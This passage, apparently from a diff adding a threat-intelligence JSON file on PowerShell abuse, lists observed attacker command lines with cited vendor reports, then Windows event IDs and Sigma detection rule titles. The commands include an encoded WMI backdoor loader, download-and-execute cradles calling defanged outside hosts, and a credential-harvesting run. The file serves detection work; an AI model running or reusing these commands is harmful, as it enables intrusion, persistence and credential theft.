+        "command": "powershell.exe -NonInteractive -ExecutionPolicy Bypass -EncodedCommand ZgB1AG4AYwB0AGkAbwBuACAAcABlAHIAZgBDAHIAKAAkAGMAcgBUAHIALAAgACQAZABhAHQAYQApAA0ACgB7AA0ACgAJACQAcgBlAHQAIAA9ACAAJABuAHUAbABsAA0ACgAJAHQAcgB5AHsADQAKAAkACQAkAG0AcwAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQANAAoACQAJACQAYwBzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAEMAcgB5AHAAdABvAGcAcgBhAHAAaAB5AC4AQwByAHkAcAB0AG8AUwB0AHIAZQBhAG0AIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAQAAoACQAbQBzACwAIAAkAGMAcgBUAHIALAAgAFsAUwB5AHMAdABlAG0ALgBTAGUAYwB1AHIAaQB0AHkALgBDAHIAeQBwAHQAbwBnAHIAYQBwAGgAeQAuAEMAcgB5AHAAdABvAFMAdAByAGUAYQBtAE0AbwBkAGUAXQA6ADoAVwByAGkAdABlACkADQAKAAkACQAkAGMAcwAuAFcAcgBpAHQAZQAoACQAZABhAHQAYQAsACAAMAAsACAAJABkAGEAdABhAC4ATABlAG4AZwB0AGgAKQANAAoACQAJACQAYwBzAC4ARgBsAHUAcwBoAEYAaQBuAGEAbABCAGwAbwBjAGsAKAApAA0ACgAJAAkAJAByAGUAdAAgAD0AIAAkAG0AcwAuAFQAbwBBAHIAcgBhAHkAKAApAA0ACgAJAAkAJABjAHMALgBDAGwAbwBzAGUAKAApAA0ACgAJAAkAJABtAHMALgBDAGwAbwBzAGUAKAApAA0ACgAJAH0ADQAKAAkAYwBhAHQAYwBoAHsAfQANAAoACQByAGUAdAB1AHIAbgAgACQAcgBlAHQADQAKAH0ADQAKAA0ACgBmAHUAbgBjAHQAaQBvAG4AIABkAGUAYwByAEEAZQBzACgAJABlAG4AYwBEAGEAdABhACwAIAAkAGsAZQB5ACwAIAAkAGkAdgApAA0ACgB7AA0ACgAJACQAcgBlAHQAIAA9ACAAJABuAHUAbABsAA0ACgAJAHQAcgB5AHsADQAKAAkACQAkAHAAcgBvAHYAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5AC4AQwByAHkAcAB0AG8AZwByAGEAcABoAHkALgBSAGkAagBuAGQAYQBlAGwATQBhAG4AYQBnAGUAZAANAAoACQAJACQAcAByAG8AdgAuAEsAZQB5ACAAPQAgACQAawBlAHkADQAKAAkACQAkAHAAcgBvAHYALgBJAFYAIAA9ACAAJABpAHYADQAKAAkACQAkAGQAZQBjAHIAIAA9ACAAJABwAHIAbwB2AC4AQwByAGUAYQB0AGUARABlAGMAcgB5AHAAdABvAHIAKAAkAHAAcgBvAHYALgBLAGUAeQAsACAAJABwAHIAbwB2AC4ASQBWACkADQAKAAkACQAkAHIAZQB0ACAAPQAgAHAAZQByAGYAQwByACAAJABkAGUAYwByACAAJABlAG4AYwBEAGEAdABhAA0ACgAJAH0ADQAKAAkAYwBhAHQAYwBoAHsAfQANAAoACQByAGUAdAB1AHIAbgAgACQAcgBlAHQADQAKAH0ADQAKAA0ACgBmAHUAbgBjAHQAaQBvAG4AIABzAFcAUAAoACQAYwBOACwAIAAkAHAATgAsACAAJABhAEsALAAgACQAYQBJACkADQAKAHsADQAKAAkAaQBmACgAJABjAE4AIAAtAGUAcQAgACQAbgB1AGwAbAAgAC0AbwByACAAJABwAE4AIAAtAGUAcQAgACQAbgB1AGwAbAApAHsAcgBlAHQAdQByAG4AIAAkAGYAYQBsAHMAZQB9AA0ACgAJAHQAcgB5AHsADQAKAAkACQAkAHcAcAAgAD0AIAAoAFsAdwBtAGkAYwBsAGEAcwBzAF0AJABjAE4AKQAuAFAAcgBvAHAAZQByAHQAaQBlAHMAWwAkAHAATgBdAC4AVgBhAGwAdQBlAA0ACgAJAAkAJABlAHgARQBuACAAPQAgAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJAB3AHAAKQANAAoACQAJACQAZQB4AEQAZQBjACAAPQAgAGQAZQBjAHIAQQBlAHMAIAAkAGUAeABFAG4AIAAkAGEASwAgACQAYQBJAA0ACgAJAAkAJABlAHgAIAA9ACAAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAZQB4AEQAZQBjACkADQAKAAkACQBpAGYAKAAkAGUAeAAgAC0AZQBxACAAJABuAHUAbABsACAALQBvAHIAIAAkAGUAeAAgAC0AZQBxACAAJwAnACkADQAKAAkACQB7AHIAZQB0AHUAcgBuAH0ADQAKAAkACQBJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAkAGUAeAANAAoACQAJAHIAZQB0AHUAcgBuACAAJAB0AHIAdQBlAA0ACgAJAH0ADQAKAAkAYwBhAHQAYwBoAHsADQAKAAkACQByAGUAdAB1AHIAbgAgACQAZgBhAGwAcwBlAA0ACgAJAH0ADQAKAH0ADQAKAA0ACgAkAGEAZQBLACAAPQAgAFsAYgB5AHQAZQBbAF0AXQAgACgAMAB4AGUANwAsACAAMAB4AGQANgAsACAAMAB4AGIAZQAsACAAMAB4AGEAOQAsACAAMAB4AGIANwAsACAAMAB4AGUANgAsACAAMAB4ADUANQAsACAAMAB4ADMAYQAsACAAMAB4AGUAZQAsACAAMAB4ADEANgAsACAAMAB4ADcAOQAsACAAMAB4AGMAYQAsACAAMAB4ADUANgAsACAAMAB4ADAAZgAsACAAMAB4AGIAYwAsACAAMAB4ADMAZgAsACAAMAB4ADIAMgAsACAAMAB4AGUAZAAsACAAMAB4AGYAZgAsACAAMAB4ADAAMgAsACAAMAB4ADQAMwAsACAAMAB4ADQAYwAsACAAMAB4ADEAYgAsACAAMAB4AGMAMAAsACAAMAB4AGUANwAsACAAMAB4ADUANwAsACAAMAB4AGIAMgAsACAAMAB4AGMAYgAsACAAMAB4AGQAOAAsACAAMAB4AGMAZQAsACAAMAB4AGQAYQAsACAAMAB4ADAAMAApAA0ACgAkAGEAZQBJACAAPQAgAFsAYgB5AHQAZQBbAF0AXQAgACgAMAB4AGIAZQAsACAAMAB4ADcAYQAsACAAMAB4ADkAMAAsACAAMAB4AGQAOQAsACAAMAB4AGQANQAsACAAMAB4AGYANwAsACAAMAB4AGEAYQAsACAAMAB4ADYAZAAsACAAMAB4AGUAOQAsACAAMAB4ADEANgAsACAAMAB4ADYANAAsACAAMAB4ADEAZAAsACAAMAB4ADkANwAsACAAMAB4ADEANgAsACAAMAB4AGMAMAAsACAAMAB4ADYANwApAA0ACgBzAFcAUAAgACcAVwBtAGkAJwAgACcAVwBtAGkAJwAgACQAYQBlAEsAIAAkAGEAZQBJACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA=",
+        "intent": "A single obfuscated command set up to run persistently through WMI is the PowerShell backdoor.",
+        "status": "verified",
+        "source_name": "CrowdStrike Bears in the Midst DNC Intrusion",
+        "source_url": "https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/"
+      },
+      {
+        "command": "powershell -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://testzake[.]com/IR.ps1');Invoke-ReflectivePEInjection -PEUrl http://testzake[.]com/s.exe\"",
+        "intent": "The BBSRAT downloader decrypts this string and executes it through WinExec to load the Trojan with Invoke-ReflectivePEInjection.",
+        "status": "verified",
+        "source_name": "Unit 42 BBSRAT Roaming Tiger December 2015",
+        "source_url": "http://researchcenter.paloaltonetworks.com/2015/12/bbsrat-attacks-targeting-russian-organizations-linked-to-roaming-tiger/"
+      },
+      {
+        "command": "powershell -exec bypass -file \"C:\\Users\\Administrator\\AppData\\Local\\Temp\\SystemDiskClean.ps1\"",
+        "intent": "The dropper writes the payload to SystemDiskClean.ps1 in the user Temp folder and executes it as a shell object.",
+        "status": "verified",
+        "source_name": "Unit 42 OilRig QuadAgent July 2018",
+        "source_url": "https://researchcenter.paloaltonetworks.com/2018/07/unit42-oilrig-targets-technology-service-provider-government-agency-quadagent/"
+      },
+      {
+        "command": "powershell.exe -nop -w hidden -c \"((new-object net.webclient).downloadstring('http://jpsrv-java-jdkec2.javaupdate[.]co:80/JPOST'))\"",
+        "intent": "The self-extracting executable serves as a downloader running this command; the C&C server sends back PowerShell code that loads a Cobalt Strike stager into memory.",
+        "status": "verified",
+        "source_name": "ClearSky and Trend Micro Operation Wilted Tulip July 2017",
+        "source_url": "http://www.clearskysec.com/wp-content/uploads/2017/07/Operation_Wilted_Tulip.pdf"
+      },
+      {
+        "command": "PowerShell.exe -ExecutionPolicy Bypass -File getpwd.ps1 >iistail.log",
+        "intent": "In one incident the threat actor used access from extensive web shell deployment to harvest account credentials.",
+        "status": "verified",
+        "source_name": "Secureworks BRONZE UNION",
+        "source_url": "https://www.secureworks.com/research/bronze-union"
+      },
+      {
+        "command": "powershell -c (New-Object Net.WebClient).DownloadFile('hxxp://download[.]anydesk[.]com/AnyDesk[.]msi', 'AnyDesk.msi')",
+        "intent": "As part of persistence, this PowerShell command was executed to download AnyDesk, which was installed as a service.",
+        "status": "verified",
+        "source_name": "The DFIR Report Confluence Exploit LockBit February 2025",
+        "source_url": "https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/"
+      },
+      {
+        "command": "powershell.exe -nop -ep bypass -c C:\\sldr.ps1 B4a0f3AE251b7689CFdDe1 1> \\\\127.0.0.1\\ADMIN$\\__1621898828.3311949 2>&1",
+        "intent": "Persistence on servers was established with commands such as this one, which runs sldr.ps1 to create WMI objects for persistence.",
+        "status": "verified",
+        "source_name": "Bitdefender Deep Dive into a FIN8 Attack",
+        "source_url": "https://businessinsights.bitdefender.com/deep-dive-into-a-fin8-attack-a-forensic-investigation"
+      },
+      {
+        "command": "powershell -nop -ep bypass -c CSIDL_SYSTEM_DRIVE\\shvnc.ps1 1> \\\\127.0.0.1\\ADMIN$\\__1671129123.2520242 2>&1",
+        "intent": "Using what looked like wmiexec.py, the attackers started a process that launched a new PowerShell backdoor.",
+        "status": "verified",
+        "source_name": "Symantec Syssphinx FIN8 Backdoor",
+        "source_url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/syssphinx-fin8-backdoor"
+      },
+      {
+        "command": "powershell.exe {$file='c:\\windows\\dllhost.exe'; Invoke-WebRequest -Uri 'hXXp://148.251.71[.]182/update[.]tmp' -OutFile $file}",
+        "intent": "A scheduled task launched PowerShell to download the Golang binary dllhost.exe, which a batch script then looped through executing.",
+        "status": "verified",
+        "source_name": "The DFIR Report APT35 ProxyShell March 2022",
+        "source_url": "https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -command (new-object net.webclient).downloadfile('http://[REDACTED_DOMAIN_CONTROLLER]:8080/grand.exe', 'c:\\\\programdata\\\\r.exe'); c:\\\\programdata\\\\r.exe --password VvO8EtUh --spread [REDACTED_DOMAIN]\\\\[REDACTED_USER]:[REDACTED_PASSWORD]",
+        "intent": "PowerShell run from a scheduled task context downloaded the ransomware encryptor grand.exe from an internal staging server and executed it as c:\\programdata\\r.exe.",
+        "status": "verified",
+        "source_name": "Check Point DFIR Report The Gentlemen April 2026",
+        "source_url": "https://research.checkpoint.com/2026/dfir-report-the-gentlemen/"
+      },
+      {
+        "command": "powershell.exe -windowstyle hidden -exec bypass \"c:\\users\\public\\pro.ps1\" 3",
+        "intent": "The dropper creates a file named pro.ps1 and executes it via PowerShell.",
+        "status": "verified",
+        "source_name": "Securelist ToddyCat Keep Calm and Check Logs",
+        "source_url": "https://securelist.com/toddycat-keep-calm-and-check-logs/110696/"
+      }
+    ]
+  },
+  "detections": {
+    "eventsid": [
+      {
+        "log": "WinEventLog:PowerShell",
+        "event_id": 400,
+        "data_components": "Process Metadata",
+        "techniques": "T1059.001"
+      },
+      {
+        "log": "WinEventLog:PowerShell",
+        "event_id": 403,
+        "data_components": "Process Metadata",
+        "techniques": "T1059.001"
+      },
+      {
+        "log": "WinEventLog:PowerShell",
+        "event_id": 4103,
+        "data_components": "Command Execution",
+        "techniques": "T1059.001"
+      },
+      {
+        "log": "WinEventLog:PowerShell",
+        "event_id": 4104,
+        "data_components": "Command Execution",
+        "techniques": "T1059.001"
+      },
+      {
+        "log": "WinEventLog:PowerShell",
+        "event_id": 4105,
+        "data_components": "Command Execution",
+        "techniques": "T1059.001"
+      },
+      {
+        "log": "WinEventLog:PowerShell",
+        "event_id": 4106,
+        "data_components": "Command Execution",
+        "techniques": "T1059.001"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 1,
+        "data_components": "Process Creation",
+        "techniques": "T1059.001"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 7,
+        "data_components": "Module Load",
+        "techniques": "T1059.001"
+      }
+    ],
+    "sigma_rules": [
+      {
+        "title": "Network Connection Initiated By PowerShell Process",
+        "level": "low",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-threat-hunting/windows/network_connection/net_connection_win_powershell_network_connection.yml"
+      },
+      {
+        "title": "Unusually Long PowerShell CommandLine",
+        "level": "low",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-threat-hunting/windows/process_creation/proc_creation_win_powershell_abnormal_commandline_size.yml"
+      },
+      {
+        "title": "Invocation Of Crypto-Classes From The \"Cryptography\" PowerShell Namespace",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-threat-hunting/windows/process_creation/proc_creation_win_powershell_crypto_namespace.yml"
+      },
+      {
+        "title": "Import New Module Via PowerShell CommandLine",
+        "level": "low",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-threat-hunting/windows/process_creation/proc_creation_win_powershell_import_module.yml"
+      },
+      {
+        "title": "New Windows Firewall Rule Added Via New-NetFirewallRule Cmdlet",
+        "level": "low",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-threat-hunting/windows/process_creation/proc_creation_win_powershell_new_netfirewallrule_allow.yml"
+      },
+      {
+        "title": "Potential Binary Or Script Dropper Via PowerShell",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/file/file_event/file_event_win_powershell_drop_binary_or_script.yml"
+      },
+      {
+        "title": "PowerShell Script Dropped Via PowerShell.EXE",
+        "level": "low",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/file/file_event/file_event_win_powershell_drop_powershell.yml"
+      },
+      {
+        "title": "PowerShell Module File Created",
+        "level": "low",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/file/file_event/file_event_win_powershell_module_creation.yml"
+      },
+      {
+        "title": "PowerShell Module File Created By Non-PowerShell Process",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/file/file_event/file_event_win_powershell_module_uncommon_creation.yml"
+      },
+      {
+        "title": "Potential Startup Shortcut Persistence Via PowerShell.EXE",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/file/file_event/file_event_win_powershell_startup_shortcuts.yml"
+      },
+      {
+        "title": "PowerShell Core DLL Loaded By Non PowerShell Process",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/image_load/image_load_dll_system_management_automation_susp_load.yml"
+      },
+      {
+        "title": "Alternate PowerShell Hosts Pipe",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/pipe_created/pipe_created_powershell_alternate_host_pipe.yml"
+      },
+      {
+        "title": "Powershell Executed From Headless ConHost Process",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_conhost_headless_powershell.yml"
+      },
+      {
+        "title": "HackTool - CrackMapExec PowerShell Obfuscation",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_hktl_crackmapexec_powershell_obfuscation.yml"
+      },
+      {
+        "title": "AADInternals PowerShell Cmdlets Execution - ProccessCreation",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_aadinternals_cmdlets_execution.yml"
+      },
+      {
+        "title": "Potential Active Directory Enumeration Using AD Module - ProcCreation",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_active_directory_module_dll_import.yml"
+      },
+      {
+        "title": "Add Windows Capability Via PowerShell Cmdlet",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_add_windows_capability.yml"
+      },
+      {
+        "title": "New User Account Creation Attempt Via ADSI in CommandLine",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_adsi_create_user.yml"
+      },
+      {
+        "title": "PowerShell AppLocker Policy Discovery Via Get-AppLockerPolicy",
+        "level": "low",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_applocker_policy_discovery_via_get_applockerpolicy.yml"
+      },
+      {
+        "title": "Suspicious Encoded PowerShell Command Line",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_base64_encoded_cmd.yml"
+      },
+      {
+        "title": "Suspicious PowerShell Encoded Command Patterns",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_base64_encoded_cmd_patterns.yml"
+      },
+      {
+        "title": "Malicious Base64 Encoded PowerShell Keywords in Command Lines",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_base64_hidden_flag.yml"
+      },
+      {
+        "title": "PowerShell Base64 Encoded Invoke Keyword",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_base64_invoke.yml"
+      },
+      {
+        "title": "PowerShell Base64 Encoded WMI Classes",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_base64_wmi_classes.yml"
+      },
+      {
+        "title": "Potential Script Proxy Execution Via CL_Mutexverifiers.ps1",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_cl_mutexverifiers.yml"
+      },
+      {
+        "title": "PowerShell Dynamic Module Invocation Via ExportedCommands Array Index",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_cmdlet_invocation_via_exported_commands_array_index.yml"
+      },
+      {
+        "title": "ConvertTo-SecureString Cmdlet Usage Via CommandLine",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_cmdline_convertto_securestring.yml"
+      },
+      {
+        "title": "Potential PowerShell Obfuscation Via Reversed Commands",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_cmdline_reversed_strings.yml"
+      },
+      {
+        "title": "Potential PowerShell Command Line Obfuscation",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_cmdline_special_characters.yml"
+      },
+      {
+        "title": "Obfuscated PowerShell MSI Install via WindowsInstaller COM",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_comobject_msi.yml"
+      },
+      {
+        "title": "PowerShell MSI Install via WindowsInstaller COM From Remote Location",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_comobject_msi_remote.yml"
+      },
+      {
+        "title": "Computer Discovery And Export Via Get-ADComputer Cmdlet",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_computer_discovery_get_adcomputer.yml"
+      },
+      {
+        "title": "PowerShell Execution With Potential Decryption Capabilities",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_decrypt_pattern.yml"
+      },
+      {
+        "title": "Disable Windows Defender AV Security Monitoring",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_disable_defender_av_security_monitoring.yml"
+      },
+      {
+        "title": "Windows Firewall Disabled via PowerShell",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_disable_firewall.yml"
+      },
+      {
+        "title": "Potential PowerShell Downgrade Attack",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_downgrade_attack.yml"
+      },
+      {
+        "title": "Obfuscated PowerShell OneLiner Execution",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_download_cradle_obfuscated.yml"
+      },
+      {
+        "title": "PowerShell Download Pattern",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_download_patterns.yml"
+      },
+      {
+        "title": "Potentially Suspicious File Download From File Sharing Domain Via PowerShell.EXE",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_download_susp_file_sharing_domains.yml"
+      },
+      {
+        "title": "Email Exifiltration Via Powershell",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_email_exfil.yml"
+      },
+      {
+        "title": "Suspicious Execution of Powershell with Base64",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_encode.yml"
+      },
+      {
+        "title": "Potential Encoded PowerShell Patterns In CommandLine",
+        "level": "low",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_encoding_patterns.yml"
+      },
+      {
+        "title": "Suspicious PowerShell IEX Execution Patterns",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_iex_patterns.yml"
+      },
+      {
+        "title": "Unsigned AppX Installation Attempt Using Add-AppxPackage",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_install_unsigned_appx_packages.yml"
+      },
+      {
+        "title": "Suspicious PowerShell Invocations - Specific - ProcessCreation",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_invocation_specific.yml"
+      },
+      {
+        "title": "Suspicious Invoke-WebRequest Execution With DirectIP",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_invoke_webrequest_direct_ip.yml"
+      },
+      {
+        "title": "Suspicious Invoke-WebRequest Execution",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_invoke_webrequest_download.yml"
+      },
+      {
+        "title": "Suspicious Kerberos Ticket Request via CLI",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_kerberos_kerberos_ticket_request_via_cli.yml"
+      },
+      {
+        "title": "Non Interactive PowerShell Process Spawned",
+        "level": "low",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_non_interactive_execution.yml"
+      },
+      {
+        "title": "Execution of Powershell Script in Public Folder",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_public_folder.yml"
+      },
+      {
+        "title": "Potential Powershell ReverseShell Connection",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_reverse_shell_connection.yml"
+      },
+      {
+        "title": "Run PowerShell Script from ADS",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_run_script_from_ads.yml"
+      },
+      {
+        "title": "Run PowerShell Script from Redirected Input Stream",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_run_script_from_input_stream.yml"
+      },
+      {
+        "title": "Suspicious PowerShell Invocation From Script Engines",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_script_engine_parent.yml"
+      },
+      {
+        "title": "Potentially Suspicious Powershell Script Execution From Temp Folder",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_script_exec_from_temp_folder.yml"
+      },
+      {
+        "title": "PowerShell Script Change Permission Via Set-Acl",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_set_acl.yml"
+      },
+      {
+        "title": "PowerShell Set-Acl On Windows Folder",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_set_acl_susp_location.yml"
+      },
+      {
+        "title": "Change PowerShell Policies to an Insecure Level",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_set_policies_to_unsecure_level.yml"
+      },
+      {
+        "title": "Service StartupType Change Via PowerShell Set-Service",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_set_service_disabled.yml"
+      },
+      {
+        "title": "Exchange PowerShell Snap-Ins Usage",
+        "level": "high",
